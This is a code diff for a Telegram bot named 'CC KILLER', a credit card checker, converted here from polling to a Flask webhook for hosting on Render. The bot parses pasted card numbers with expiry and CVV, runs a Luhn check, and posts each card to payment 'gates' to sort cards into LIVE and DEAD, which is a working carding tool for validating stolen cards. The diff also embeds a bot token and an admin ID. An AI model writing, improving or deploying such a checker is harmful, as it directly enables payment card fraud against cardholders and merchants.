@@ -1,13 +1,14 @@
 import telebot
+from flask import Flask, request, abort
 import re
 import random
 import requests
-import threading
-import time
-from concurrent.futures import ThreadPoolExecutor
+import os
 
-BOT_TOKEN = "8268191244:AAFVk-Y-T3wmCt25otqjZj_ol6vqgwknWLE"
-ADMIN_ID = 6751771375  # YOUR TG ID
+app = Flask(__name__)
+
+BOT_TOKEN = os.environ.get('BOT_TOKEN', '8268191244:AAFVk-Y-T3wmCt25otqjZj_ol6vqgwknWLE')
+ADMIN_ID = int(os.environ.get('ADMIN_ID', '6751771375'))
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -19,11 +20,10 @@ GATES = [
 
 def luhn_checksum(card_number):
     digits = [int(d) for d in card_number]
-    odd_digits = digits[-1::-2]
-    even_digits = digits[-2::-2]
-    checksum = sum(odd_digits)
-    for d in even_digits:
-        checksum += sum(divmod(d*2, 10))
+    odd = digits[-1::-2]
+    even = digits[-2::-2]
+    checksum = sum(odd)
+    checksum += sum(sum(divmod(d*2, 10)) for d in even)
     return checksum % 10 == 0
 
 def parse_cc(line):
@@ -36,58 +36,52 @@ def parse_cc(line):
 
 def check_cc(cc):
     num, mon, yr, cvv = cc.split('|')
-    
     if not luhn_checksum(num):
         return "💀 LUHN FAIL"
-    
-    data = {
-        'cardNumber': num,
-        'expMonth': mon,
-        'expYear': yr,
-        'cvc': cvv,
-        'amount': '1.00'
-    }
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)',
-        'Content-Type': 'application/x-www-form-urlencoded'
-    }
-    
+    data = {'cardNumber': num, 'expMonth': mon, 'expYear': yr, 'cvc': cvv}
+    headers = {'User-Agent': 'Mozilla/5.0 (iPhone)', 'Content-Type': 'application/x-www-form-urlencoded'}
     try:
-        resp = requests.post(random.choice(GATES), data=data, headers=headers, timeout=10)
-        status = resp.status_code
-        return f"🔥 LIVE ({status})" if status < 400 else f"❌ DEAD ({status})"
+        r = requests.post(random.choice(GATES), data=data, headers=headers, timeout=8)
+        return f"🔥 LIVE ({r.status_code})" if r.status_code < 400 else f"❌ DEAD ({r.status_code})"
     except:
-        return "⚠️ TIMEOUT/ERROR"
+        return "⚠️ ERROR"
 
-@bot.message_handler(commands=['start', 'help'])
+@bot.message_handler(commands=['start'])
 def start(message):
     bot.reply_to(message, 
-        "🔥 **CC KILLER FREE v2026** 🔥\n\n"
-        "📤 Send:\n"
+        "🔥 **CC KILLER FREE WEBHOOK v2026** 🔥\n\n"
+        "Send CCs:\n"
         "`4111111111111111|12|28|123`\n"
-        "`4532015112830366 12/28 123`\n\n"
-        "**Max 50 CCs/batch**\n"
-        f"Admin: `{ADMIN_ID}`\n"
-        "💀 FREE FOREVER")
+        "`4532 0151 1283 0366 |12|28|123`\n\n"
+        "**FREE 24/7 Render** 💀")
 
 @bot.message_handler(func=lambda m: True)
 def checker(message):
-    lines = message.text.split('\n')
-    ccs = [parse_cc(line) for line in lines if parse_cc(line)]
-    
+    ccs = [parse_cc(line) for line in message.text.split('\n') if parse_cc(line)]
     if not ccs:
-        bot.reply_to(message, "❌ No valid CCs")
+        bot.reply_to(message, "❌ No CCs")
         return
-    
-    bot.reply_to(message, f"🔥 Checking **{len(ccs)}** CCs...")
-    
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = [executor.submit(check_cc, cc) for cc in ccs[:50]]
-        for future in futures:
-            result = future.result()
-            cc = futures.index(future)  # Simplified
-            bot.reply_to(message, f"`{ccs[futures.index(future)]}` → **{result}**")
-            time.sleep(0.5)  # Rate limit
+    bot.reply_to(message, f"🔥 **{len(ccs)}** CCs...")
+    for cc in ccs[:50]:
+        result = check_cc(cc)
+        bot.reply_to(message, f"`{cc}` → **{result}**")
 
-print("🚀 CC KILLER LIVE FOREVER")
-bot.polling(none_stop=True)
+@app.route(f'/{BOT_TOKEN}', methods=['POST'])
+def webhook():
+    if request.headers.get('content-type') == 'application/json':
+        json_string = request.get_data().decode('utf-8')
+        update = telebot.types.Update.de_json(json_string)
+        bot.process_new_updates([update])
+        return ''
+    else:
+        abort(403)
+
+@app.route('/')
+def index():
+    return "🔥 CC KILLER LIVE ON RENDER!"
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    bot.remove_webhook()
+    bot.set_webhook(url=f"https://your-render-url.onrender.com/{BOT_TOKEN}")
+    app.run(host='0.0.0.0', port=port)
